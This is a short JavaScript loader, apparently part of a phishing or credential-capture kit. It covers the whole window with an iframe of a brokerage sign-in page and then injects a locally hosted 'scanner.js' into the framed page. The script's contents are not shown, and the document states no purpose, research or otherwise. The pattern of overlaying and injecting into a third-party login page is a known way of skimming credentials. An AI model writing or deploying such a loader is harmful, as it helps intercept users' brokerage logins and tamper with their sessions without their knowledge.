console.log("[Nexus Loader] Iniciando carregamento...");

(function () {
    const target = "https://www.homebroker.com/pt/sign-in";

    console.log("[Nexus Loader] Criando iframe...");

    const iframe = document.createElement("iframe");
    iframe.src = target;
    iframe.style.position = "fixed";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.style.width = "100%";
    iframe.style.height = "100%";
    iframe.style.border = "none";
    iframe.id = "nexus_iframe";
    document.body.appendChild(iframe);

    iframe.onload = function () {
        console.log("[Nexus Loader] Iframe carregado, injetando scanner...");

        const script = document.createElement("script");
        script.src = "/static/scanner.js";
        script.type = "text/javascript";

        iframe.contentWindow.document.body.appendChild(script);

        console.log("[Nexus Loader] scanner.js injetado com sucesso.");
    };
})();
